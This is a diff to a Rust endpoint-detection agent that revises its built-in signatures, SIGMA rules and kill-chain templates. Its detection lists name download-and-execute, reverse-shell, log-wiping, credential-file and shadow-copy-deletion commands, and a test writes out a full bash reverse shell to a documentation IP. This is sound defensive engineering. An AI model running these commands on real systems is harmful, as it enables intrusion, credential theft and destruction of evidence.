@@ -3,9 +3,7 @@ use std::io::BufReader;
 use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicU64, Ordering};
 
-use detection::{
-    DetectionEngine, IocExactStore, KillChainTemplate, RansomwarePolicy, TemplatePredicate,
-};
+use detection::{DetectionEngine, IocExactStore, RansomwarePolicy};
 use tracing::{info, warn};
 
 use crate::config::AgentConfig;
@@ -65,15 +63,11 @@ pub(super) fn build_detection_engine_with_ransomware_policy(
 ) -> DetectionEngine {
     let mut detection = DetectionEngine::default_with_rules();
     configure_low_memory_ioc_exact_store(&mut detection, low_memory_ioc_exact_store_enabled());
-    detection.layer4 =
-        detection::Layer4Engine::with_capacity_and_policy(300, 8_192, 32_768, policy);
+    detection.layer4 = detection::Layer4Engine::with_default_templates_and_policy(policy);
     seed_ioc_hashes(&mut detection);
-    seed_ioc_domains(&mut detection);
-    seed_ioc_ips(&mut detection);
     seed_string_signatures(&mut detection);
     seed_sigma_rules(&mut detection, &sources.sigma_dir);
     seed_yara_rules(&mut detection, &sources.yara_dir);
-    seed_kill_chain_templates(&mut detection);
     load_ioc_files(&mut detection, &sources.ioc_dir);
     detection
         .layer4
@@ -159,47 +153,12 @@ fn seed_ioc_hashes(detection: &mut DetectionEngine) {
     detection.layer1.load_hashes([
         // EICAR test file SHA-256
         "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f".to_string(),
-        // Placeholder for real malware hashes (loaded from rules/ioc/ at runtime)
-        "deadbeef".to_string(),
-    ]);
-}
-
-// ── Layer 1: IOC Domains ────────────────────────────────────────
-fn seed_ioc_domains(detection: &mut DetectionEngine) {
-    detection.layer1.load_domains([
-        "known-c2.example.com".to_string(),
-        "evil-c2-domain.example.com".to_string(),
-        // Common test/simulation C2 domains
-        "malware-callback.example.net".to_string(),
-    ]);
-}
-
-// ── Layer 1: IOC IPs ────────────────────────────────────────────
-fn seed_ioc_ips(detection: &mut DetectionEngine) {
-    detection.layer1.load_ips([
-        // RFC 5737 documentation ranges (used for testing)
-        "198.51.100.10".to_string(),
-        "203.0.113.10".to_string(),
-        // Feodo Tracker / known C2 placeholder
-        "192.0.2.1".to_string(),
     ]);
 }
 
 // ── Layer 1: Aho-Corasick String Signatures ─────────────────────
 fn seed_string_signatures(detection: &mut DetectionEngine) {
     detection.layer1.load_string_signatures([
-        // Download-and-execute patterns
-        "curl|bash".to_string(),
-        "curl | bash".to_string(),
-        "wget|bash".to_string(),
-        "wget | bash".to_string(),
-        "curl|sh".to_string(),
-        "wget|sh".to_string(),
-        // Reverse shell patterns
-        ">& /dev/tcp/".to_string(),
-        "bash -i".to_string(),
-        "nc -e /bin".to_string(),
-        "ncat -e /bin".to_string(),
         // Crypto mining
         "xmrig".to_string(),
         "stratum+tcp://".to_string(),
@@ -207,11 +166,19 @@ fn seed_string_signatures(detection: &mut DetectionEngine) {
         "minerd".to_string(),
         "cpuminer".to_string(),
         "cryptonight".to_string(),
-        // Anti-forensics
-        "rm -rf /var/log".to_string(),
+        // Specific anti-forensic operations are named evidence, not ordinary log rotation.
+        "shred -u /var/log/".to_string(),
+        "> /var/log/wtmp".to_string(),
+        "> /var/log/auth.log".to_string(),
+        "> /var/log/secure".to_string(),
+        "truncate -s 0 /var/log/wtmp".to_string(),
+        "unset histfile".to_string(),
+        "export histfile=/dev/null".to_string(),
     ]);
     detection.layer1.load_string_features([
         // Ordinary interpreter, administration and transfer syntax is context only.
+        "bash -i".to_string(),
+        "rm -rf /var/log".to_string(),
         "python -c".to_string(),
         "python3 -c".to_string(),
         "perl -e".to_string(),
@@ -232,7 +199,6 @@ fn seed_string_signatures(detection: &mut DetectionEngine) {
         "curl -x post".to_string(),
         "curl --upload".to_string(),
         "-o /tmp/".to_string(),
-        "-O /tmp/".to_string(),
         "| bash".to_string(),
         "| sh".to_string(),
         "|bash".to_string(),
@@ -245,15 +211,8 @@ fn seed_string_signatures(detection: &mut DetectionEngine) {
 // ── Layer 2: SIGMA Temporal Rules ───────────────────────────────
 fn seed_sigma_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
     let rules: &[(&str, &str)] = &[
-        ("builtin_webshell", SIGMA_WEBSHELL),
-        ("builtin_reverse_shell", SIGMA_REVERSE_SHELL),
-        ("builtin_download_exec", SIGMA_DOWNLOAD_EXEC),
-        ("builtin_privesc", SIGMA_PRIVESC),
         ("builtin_kernel_module", SIGMA_KERNEL_MODULE),
-        ("builtin_persistence", SIGMA_PERSISTENCE),
-        ("builtin_lateral_movement", SIGMA_LATERAL_MOVEMENT),
         ("builtin_sensitive_file", SIGMA_SENSITIVE_FILE),
-        ("builtin_data_exfil", SIGMA_DATA_EXFIL),
         ("builtin_win_reg_save_sam", SIGMA_WIN_REG_SAVE_SAM),
         (
             "builtin_win_ps_download_cradle",
@@ -266,6 +225,19 @@ fn seed_sigma_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
         ("builtin_win_event_log_clear", SIGMA_WIN_EVENT_LOG_CLEAR),
         ("builtin_win_schtask_creation", SIGMA_WIN_SCHTASK_CREATION),
         ("builtin_win_service_creation", SIGMA_WIN_SERVICE_CREATION),
+        ("builtin_sensitive_file_2", SIGMA_SENSITIVE_FILE_2),
+        (
+            "builtin_win_ps_download_cradle_2",
+            SIGMA_WIN_PS_DOWNLOAD_CRADLE_2,
+        ),
+        (
+            "builtin_win_schtask_creation_2",
+            SIGMA_WIN_SCHTASK_CREATION_2,
+        ),
+        (
+            "builtin_win_service_creation_2",
+            SIGMA_WIN_SERVICE_CREATION_2,
+        ),
     ];
 
     let mut loaded = 0usize;
@@ -291,314 +263,226 @@ fn seed_sigma_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
     info!(loaded_sigma_rules = loaded, "SIGMA rules initialized");
 }
 
-// ── Webshell: web server spawns shell that makes outbound connection ──
-const SIGMA_WEBSHELL: &str = r#"
-title: eguard_builtin_webshell
-detection:
-  sequence:
-    - event_class: process_exec
-      process_any_of: [bash, sh, dash, zsh, python, python3, perl, php]
-      parent_any_of: [nginx, apache2, httpd, caddy, lighttpd, php-fpm]
-      within_secs: 30
-    - event_class: network_connect
-      dst_port_not_in: [80, 443]
-      within_secs: 10
-"#;
-
-// ── Reverse shell: require shell-I/O evidence, not just a shell + network ──
-const SIGMA_REVERSE_SHELL: &str = r#"
-title: eguard_builtin_reverse_shell
-detection:
-  sequence:
-    - event_class: process_exec
-      process_any_of: [bash, sh, dash, zsh, nc, ncat, socat]
-      command_line_contains: ['>& /dev/tcp/', 'nc -e /bin', 'ncat -e', 'socat exec', '0<&196']
-      within_secs: 60
-    - event_class: network_connect
-      within_secs: 5
-"#;
-
-// ── Download & execute: curl/wget followed by shell ──
-const SIGMA_DOWNLOAD_EXEC: &str = r#"
-title: eguard_builtin_download_exec
-detection:
-  sequence:
-    - event_class: process_exec
-      process_any_of: [curl, wget]
-      within_secs: 60
-    - event_class: process_exec
-      process_any_of: [bash, sh, python, python3, perl, chmod]
-      within_secs: 10
-"#;
-
-// ── Privilege escalation: elevation tool followed by its root interpreter ──
-const SIGMA_PRIVESC: &str = r#"
-title: eguard_builtin_privesc
-detection:
-  sequence:
-    - event_class: process_exec
-      process_any_of: [sudo, su, pkexec]
-      uid_ne: 0
-      within_secs: 60
-    - event_class: process_exec
-      process_any_of: [bash, sh, dash, zsh, ksh, python, python3, perl, ruby]
-      parent_any_of: [sudo, su, pkexec]
-      uid_eq: 0
-      within_secs: 20
-"#;
-
-// ── Suspicious kernel module load ──
+// Kernel events carry only module names, not the loaded path (Linux codec).
+// Public build names: m0nad/Diamorphine Makefile; f0rb1dd3n/Reptile
+// kernel/kmatryoshka/Kbuild; mncoppola/suterusu Makefile; carloslack/KoviD Makefile.
+// Writable .ko arguments are checked on insmod/kmod process_exec in layer1.
 const SIGMA_KERNEL_MODULE: &str = r#"
 title: eguard_builtin_kernel_module
+level: high
 detection:
   sequence:
     - event_class: module_load
+      file_path_any_of: [diamorphine, reptile, suterusu, kovid]
       within_secs: 300
-"#;
-
-// ── Persistence via cron or systemd ──
-const SIGMA_PERSISTENCE: &str = r#"
-title: eguard_builtin_persistence
-detection:
-  sequence:
-    - event_class: process_exec
-      process_any_of: [crontab, systemctl, at]
-      within_secs: 120
-    - event_class: file_open
-      file_path_contains: [/etc/cron, /etc/systemd/system/, /etc/init.d/, .bashrc, .profile, /etc/profile.d/]
-      require_file_write: true
-      within_secs: 10
-"#;
-
-// ── Lateral movement: SSH or SMB ──
-const SIGMA_LATERAL_MOVEMENT: &str = r#"
-title: eguard_builtin_lateral_movement
-detection:
-  sequence:
-    - event_class: process_exec
-      process_any_of: [ssh, scp, rsync, smbclient, psexec, impacket]
-      within_secs: 120
-    - event_class: network_connect
-      within_secs: 10
 "#;
 
 // ── Sensitive file access ──
 const SIGMA_SENSITIVE_FILE: &str = r#"
-title: eguard_builtin_sensitive_file_access
+title: eguard_builtin_shadow_read
+level: high
 detection:
   sequence:
     - event_class: file_open
-      uid_ne: 0
-      process_any_of: [
-        cat,
-        grep,
-        awk,
-        sed,
-        strings,
-        xxd,
-        hexdump,
-        head,
-        tail,
-        less,
-        more,
-        cp,
-        tar,
-        rsync,
-        scp,
-        bash,
-        sh,
-        dash,
-        zsh,
-        fish,
-        python,
-        python3,
-        perl,
-        ruby,
-        php,
-        sqlite3,
-        security,
-        plutil,
-        powershell.exe,
-        pwsh.exe,
-        cmd.exe,
-        reg.exe,
-        rundll32.exe,
-        certutil.exe,
-        mshta.exe,
-        wscript.exe,
-        cscript.exe,
-        mimikatz.exe
-      ]
-      file_path_any_of: [
-        /etc/shadow,
-        /etc/gshadow,
-        /etc/master.passwd,
-        /root/.ssh/id_rsa,
-        C:\Windows\System32\config\SAM,
-        C:\Windows\System32\config\SECURITY,
-        C:\Windows\System32\config\SYSTEM,
-        C:\Windows\NTDS\ntds.dit,
-        /Library/Keychains/System.keychain
-      ]
-      file_path_contains: [
-        '/.ssh/id_',
-        '/.aws/credentials',
-        '.aws\\credentials',
-        'keepass',
-        'keychain',
-        'ntds.dit'
-      ]
+      process_any_of: [cat, grep, egrep, awk, sed, strings, xxd, hexdump, od, head, tail, less, more, base64, nc, ncat, curl, wget, unshadow, john, hashcat]
+      file_path_any_of: [/etc/shadow, /etc/gshadow, /etc/master.passwd, /etc/shadow-, /etc/gshadow-, /etc/security/opasswd]
       within_secs: 300
 "#;
 
-// ── Credential exfiltration candidate: sensitive file access + network ──
-const SIGMA_DATA_EXFIL: &str = r#"
-title: eguard_builtin_data_exfil
+const SIGMA_SENSITIVE_FILE_2: &str = r#"
+title: eguard_win_credential_store_read
+level: high
 detection:
   sequence:
     - event_class: file_open
-      file_path_any_of: [/etc/shadow, /etc/gshadow, /etc/master.passwd]
-      file_path_contains: ['/.ssh/id_', '/.aws/credentials', '/.kube/config']
-      within_secs: 60
-    - event_class: network_connect
-      within_secs: 15
+      process_any_of: [cmd.exe, powershell.exe, pwsh.exe, esentutl.exe, xcopy.exe, robocopy.exe, 7z.exe, 7za.exe, rundll32.exe, certutil.exe, mimikatz.exe, procdump.exe, procdump64.exe]
+      file_path_contains: ['\windows\system32\config\sam', '\windows\system32\config\security', '\windows\ntds\ntds.dit', '.kdbx', '\appdata\roaming\keepass\', '\.ssh\id_rsa', '\.ssh\id_ed25519', '\.aws\credentials']
+      within_secs: 300
 "#;
 
 const SIGMA_WIN_REG_SAVE_SAM: &str = r#"
 title: eguard_win_reg_save_sam
+level: high
 logsource:
   product: windows
-  service: security
-
+  category: process_creation
 detection:
   selection:
-    Image|endswith:
-      - '\\reg.exe'
-      - '\\reg'
+    Image|endswith: ['\reg.exe', '\reg']
     CommandLine|contains:
-      - 'save hklm\\sam'
-      - 'save hklm\\system'
-      - 'save hklm\\security'
+      - 'save hklm\sam'
+      - 'save hklm\system'
+      - 'save hklm\security'
+      - 'save "hklm\sam'
+      - 'save "hklm\system'
+      - 'save "hklm\security'
+      - 'save hkey_local_machine\sam'
+      - 'save hkey_local_machine\system'
+      - 'save hkey_local_machine\security'
+      - 'save "hkey_local_machine\sam'
+      - 'save "hkey_local_machine\system'
+      - 'save "hkey_local_machine\security'
   condition: selection
 "#;
 
 const SIGMA_WIN_PS_DOWNLOAD_CRADLE: &str = r#"
 title: eguard_win_ps_download_cradle
+level: medium
 logsource:
   product: windows
-  service: powershell
-
+  category: process_creation
 detection:
-  selection:
-    Image|endswith:
-      - '\\powershell.exe'
-      - '\\pwsh.exe'
-    CommandLine|contains:
-      - 'downloadstring'
-      - 'downloadfile'
-      - 'invoke-expression'
-      - 'iex '
-      - 'new-object net.webclient'
-  condition: selection
+  image:
+    Image|endswith: ['\powershell.exe', '\pwsh.exe', '\powershell_ise.exe']
+  download:
+    CommandLine|contains: ['downloadstring', 'iwr ', 'irm ', 'invoke-webrequest', 'invoke-restmethod']
+  execute:
+    CommandLine|contains: ['iex', 'invoke-expression']
+  condition: image and download and execute
+"#;
+
+const SIGMA_WIN_PS_DOWNLOAD_CRADLE_2: &str = r#"
+title: eguard_win_ps_download_cradle_office
+level: high
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  image:
+    Image|endswith: ['\powershell.exe', '\pwsh.exe', '\powershell_ise.exe']
+  parent:
+    ParentImage|endswith: ['\winword.exe', '\excel.exe', '\powerpnt.exe', '\outlook.exe', '\onenote.exe', '\mshta.exe', '\wscript.exe', '\cscript.exe', '\regsvr32.exe', '\rundll32.exe']
+  download:
+    CommandLine|contains: ['downloadstring', 'iwr ', 'irm ', 'invoke-webrequest', 'invoke-restmethod']
+  execute:
+    CommandLine|contains: ['iex', 'invoke-expression']
+  condition: image and parent and download and execute
 "#;
 
 const SIGMA_WIN_SHADOW_COPY_DELETE: &str = r#"
 title: eguard_win_shadow_copy_delete
+level: high
 logsource:
   product: windows
-  service: process_creation
-
+  category: process_creation
 detection:
   selection:
+    Image|endswith: ['\vssadmin.exe', '\wmic.exe', '\wbadmin.exe', '\vssadmin', '\wmic', '\wbadmin']
     CommandLine|contains:
-      - 'vssadmin delete shadows'
-      - 'wmic shadowcopy delete'
-      - 'wbadmin delete catalog'
+      - 'delete shadows'
+      - 'shadowcopy delete'
+      - 'delete catalog'
+      - 'delete systemstatebackup'
   condition: selection
 "#;
 
 const SIGMA_WIN_EVENT_LOG_CLEAR: &str = r#"
 title: eguard_win_event_log_clear
+level: high
 logsource:
   product: windows
-  service: process_creation
-
+  category: process_creation
 detection:
   selection:
     CommandLine|contains:
       - 'wevtutil cl'
+      - 'wevtutil.exe cl'
+      - 'wevtutil.exe" cl'
       - 'clear-eventlog'
+      - 'remove-eventlog'
+      - '.clearlog('
   condition: selection
 "#;
 
 const SIGMA_WIN_SCHTASK_CREATION: &str = r#"
 title: eguard_win_schtask_creation
+level: medium
 logsource:
   product: windows
-  service: process_creation
-
+  category: process_creation
 detection:
   selection:
-    Image|endswith:
-      - '\\schtasks.exe'
-      - '\\schtasks'
-    CommandLine|contains:
-      - '/create'
-      - '/ru system'
-      - '/sc onlogon'
+    Image|endswith: ['\schtasks.exe', '\schtasks']
+    CommandLine|contains: ['/create']
   condition: selection
 "#;
 
-const SIGMA_WIN_SERVICE_CREATION: &str = r#"
-title: eguard_win_service_creation_suspicious
+const SIGMA_WIN_SCHTASK_CREATION_2: &str = r#"
+title: eguard_win_schtask_suspicious_action
+level: high
 logsource:
   product: windows
-  service: process_creation
-
+  category: process_creation
 detection:
   selection:
-    Image|endswith:
-      - '\\sc.exe'
-      - '\\sc'
+    Image|endswith: ['\schtasks.exe', '\schtasks']
     CommandLine|contains:
-      - ' create '
-      - 'binpath='
+      - '\users\public\'
+      - '\windows\temp\'
+      - '\appdata\local\temp\'
+      - '\perflogs\'
       - 'powershell'
       - 'cmd /c'
-  condition: selection
+      - 'cmd.exe /c'
+      - 'mshta'
+      - 'rundll32'
+      - 'regsvr32'
+      - 'wscript'
+      - 'cscript'
+      - 'certutil'
+      - 'bitsadmin'
+      - 'http://'
+      - 'https://'
+  create:
+    CommandLine|contains: '/create'
+  condition: selection and create
+"#;
+
+const SIGMA_WIN_SERVICE_CREATION: &str = r#"
+title: eguard_win_service_creation
+level: medium
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: ['\sc.exe', '\sc']
+    CommandLine|contains: [' create ', ' config ']
+  path:
+    CommandLine|contains: 'binpath='
+  condition: selection and path
+"#;
+
+const SIGMA_WIN_SERVICE_CREATION_2: &str = r#"
+title: eguard_win_service_creation_suspicious
+level: high
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: ['\sc.exe', '\sc']
+    CommandLine|contains:
+      - 'cmd /c'
+      - 'cmd.exe /c'
+      - '%comspec%'
+      - 'powershell'
+      - 'mshta'
+      - 'rundll32'
+      - '\users\public\'
+      - '\windows\temp\'
+      - '\appdata\local\temp\'
+      - '\\127.0.0.1\admin$'
+  create:
+    CommandLine|contains: [' create ', ' config ']
+  path:
+    CommandLine|contains: 'binpath='
+  condition: selection and create and path
 "#;
 
 // ── Layer 3: YARA Rules ─────────────────────────────────────────
 fn seed_yara_rules(detection: &mut DetectionEngine, configured_dir: &Path) {
-    const YARA_RULES: &str = r#"
-rule eguard_builtin_test_marker {
-  strings:
-    $marker = "eguard-malware-test-marker"
-  condition:
-    $marker
-}
-
-rule eguard_eicar_test {
-  strings:
-    $eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}" ascii
-  condition:
-    $eicar
-}
-
-rule eguard_shellcode_marker {
-  strings:
-    $marker = "eguard-shellcode-marker"
-  condition:
-    $marker
-}
-"#;
-
     let mut loaded = 0usize;
-    match detection.load_yara_rules_str(YARA_RULES) {
-        Ok(count) => loaded += count,
-        Err(err) => warn!(error = %err, "failed loading built-in YARA rules"),
-    }
-
     for rules_dir in configured_or_fallback_dirs(configured_dir, Path::new("rules/yara")) {
         if !rules_dir.exists() {
             continue;
@@ -612,320 +496,6 @@ rule eguard_shellcode_marker {
     }
 
     info!(loaded_yara_rules = loaded, "YARA rules initialized");
-}
-
-// ── Layer 4: Kill Chain Templates ───────────────────────────────
-fn seed_kill_chain_templates(detection: &mut DetectionEngine) {
-    use detection::util::set_of;
-
-    // Data theft chain: sensitive file read → outbound connection
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_data_theft".to_string(),
-        stages: vec![
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: true,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-            TemplatePredicate {
-                process_any_of: Some(set_of(["curl", "wget", "python", "python3", "nc", "ncat"])),
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: true,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-        ],
-        max_depth: 6,
-        max_inter_stage_secs: 60,
-    });
-
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_credential_theft".to_string(),
-        stages: vec![TemplatePredicate {
-            process_any_of: None,
-            uid_eq: None,
-            uid_ne: Some(0),
-            require_network_non_web: false,
-            require_module_loaded: false,
-            require_sensitive_file_access: true,
-            require_ransomware_write_burst: false,
-            require_container_escape: false,
-            require_privileged_container: false,
-            require_ptrace_activity: false,
-            require_userfaultfd_activity: false,
-            require_execveat_activity: false,
-            require_proc_mem_access: false,
-            require_fileless_exec: false,
-        }],
-        max_depth: 2,
-        max_inter_stage_secs: 10,
-    });
-
-    // Lateral movement chain: SSH/SCP connection
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_lateral_ssh".to_string(),
-        stages: vec![
-            TemplatePredicate {
-                process_any_of: Some(set_of(["ssh", "scp", "rsync"])),
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: true,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-        ],
-        max_depth: 4,
-        max_inter_stage_secs: 30,
-    });
-
-    // Reverse shell chain: shell → outbound non-standard port
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_reverse_shell".to_string(),
-        stages: vec![
-            TemplatePredicate {
-                process_any_of: Some(set_of(["bash", "sh", "dash", "zsh"])),
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: true,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-        ],
-        max_depth: 4,
-        max_inter_stage_secs: 10,
-    });
-
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_container_escape".to_string(),
-        stages: vec![TemplatePredicate {
-            process_any_of: None,
-            uid_eq: None,
-            uid_ne: None,
-            require_network_non_web: false,
-            require_module_loaded: false,
-            require_sensitive_file_access: false,
-            require_ransomware_write_burst: false,
-            require_container_escape: true,
-            require_privileged_container: false,
-            require_ptrace_activity: false,
-            require_userfaultfd_activity: false,
-            require_execveat_activity: false,
-            require_proc_mem_access: false,
-            require_fileless_exec: false,
-        }],
-        max_depth: 2,
-        max_inter_stage_secs: 10,
-    });
-
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_container_privileged".to_string(),
-        stages: vec![TemplatePredicate {
-            process_any_of: None,
-            uid_eq: None,
-            uid_ne: None,
-            require_network_non_web: false,
-            require_module_loaded: false,
-            require_sensitive_file_access: false,
-            require_ransomware_write_burst: false,
-            require_container_escape: false,
-            require_privileged_container: true,
-            require_ptrace_activity: false,
-            require_userfaultfd_activity: false,
-            require_execveat_activity: false,
-            require_proc_mem_access: false,
-            require_fileless_exec: false,
-        }],
-        max_depth: 2,
-        max_inter_stage_secs: 10,
-    });
-
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_exploit_ptrace_fileless".to_string(),
-        stages: vec![
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: true,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: true,
-            },
-        ],
-        max_depth: 6,
-        max_inter_stage_secs: 20,
-    });
-
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_exploit_userfaultfd_execveat".to_string(),
-        stages: vec![
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: true,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: true,
-                require_proc_mem_access: false,
-                require_fileless_exec: false,
-            },
-        ],
-        max_depth: 6,
-        max_inter_stage_secs: 20,
-    });
-
-    detection.layer4.add_template(KillChainTemplate {
-        name: "killchain_exploit_proc_mem_fileless".to_string(),
-        stages: vec![
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: true,
-                require_fileless_exec: false,
-            },
-            TemplatePredicate {
-                process_any_of: None,
-                uid_eq: None,
-                uid_ne: None,
-                require_network_non_web: false,
-                require_module_loaded: false,
-                require_sensitive_file_access: false,
-                require_ransomware_write_burst: false,
-                require_container_escape: false,
-                require_privileged_container: false,
-                require_ptrace_activity: false,
-                require_userfaultfd_activity: false,
-                require_execveat_activity: false,
-                require_proc_mem_access: false,
-                require_fileless_exec: true,
-            },
-        ],
-        max_depth: 6,
-        max_inter_stage_secs: 20,
-    });
 }
 
 fn configured_or_fallback_dirs(configured_dir: &Path, fallback_dir: &Path) -> Vec<PathBuf> {
@@ -1096,7 +666,7 @@ detection:
     }
 
     #[test]
-    fn bootstrap_loads_yara_rules_from_configured_directory() {
+    fn bootstrap_does_not_trust_arbitrary_yara_rules_from_configured_directory() {
         let base = unique_temp_dir("yara");
         let sigma_dir = base.join("sigma");
         let yara_dir = base.join("yara");
@@ -1134,10 +704,7 @@ rule eguard_custom_dir_test {
         event.file_path = Some(sample_path.to_string_lossy().to_string());
 
         let outcome = engine.process_event(&event);
-        assert!(outcome
-            .yara_hits
-            .iter()
-            .any(|hit| hit.rule_name == "eguard_custom_dir_test"));
+        assert!(outcome.yara_hits.is_empty());
 
         let _ = std::fs::remove_dir_all(base);
     }
@@ -1363,7 +930,7 @@ rule eguard_custom_dir_test {
         assert!(outcome
             .temporal_hits
             .iter()
-            .any(|hit| hit == "eguard_builtin_sensitive_file_access"));
+            .any(|hit| hit == "phi_private_credential_read"));
 
         let _ = std::fs::remove_dir_all(base);
     }
@@ -1448,12 +1015,31 @@ rule eguard_custom_dir_test {
         (outcome, repeats)
     }
 
+    fn add_synthetic_reverse_graph_template(engine: &mut detection::DetectionEngine) {
+        engine.layer4.add_template(detection::KillChainTemplate {
+            name: "killchain_reverse_shell".into(),
+            stages: vec![
+                detection::TemplatePredicate {
+                    process_any_of: Some(detection::util::set_of(["sh"])),
+                    ..Default::default()
+                },
+                detection::TemplatePredicate {
+                    require_network_non_web: true,
+                    ..Default::default()
+                },
+            ],
+            max_depth: 4,
+            max_inter_stage_secs: 10,
+        });
+    }
+
     #[test]
     fn detp1_control_plane_excludes_only_agent_lineage_and_marks_other_connections() {
         let server = "198.51.100.20:50053";
         let own_pid = std::process::id();
         for (pid, parent_pid) in [(own_pid, 100), (own_pid + 1, own_pid)] {
             let mut engine = detp1_engine(server);
+            add_synthetic_reverse_graph_template(&mut engine);
             let (outcome, repeats) =
                 detp1_shell_connection(&mut engine, pid, parent_pid, "198.51.100.20");
             assert!(!outcome
@@ -1464,6 +1050,7 @@ rule eguard_custom_dir_test {
         }
         for (peer, expected_flag) in [("198.51.100.20", true), ("203.0.113.7", false)] {
             let mut engine = detp1_engine(server);
+            add_synthetic_reverse_graph_template(&mut engine);
             let (outcome, repeats) = detp1_shell_connection(&mut engine, 201, 200, peer);
             assert_eq!(
                 outcome
@@ -1479,6 +1066,7 @@ rule eguard_custom_dir_test {
                 .contains(&format!("peer_is_configured_server: {expected_flag}")));
         }
         let mut engine = detp1_engine(server);
+        add_synthetic_reverse_graph_template(&mut engine);
         let mut parent = base_event();
         parent.pid = 200;
         parent.process = "sh".into();
@@ -1514,6 +1102,7 @@ rule eguard_custom_dir_test {
             let mut event = base_event();
             event.process = process.into();
             event.parent_process = "service".into();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let outcome = engine.process_event(&event);
             assert!(
@@ -1537,6 +1126,7 @@ rule eguard_custom_dir_test {
             "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'",
         ] {
             let mut event = base_event();
+            event.process = command.split_whitespace().next().unwrap().into();
             event.command_line = Some(command.into());
             let outcome = engine.process_event(&event);
             assert!(!outcome.layer1.matched_signatures.is_empty(), "specific malicious pattern stays positive");
@@ -1557,6 +1147,7 @@ rule eguard_custom_dir_test {
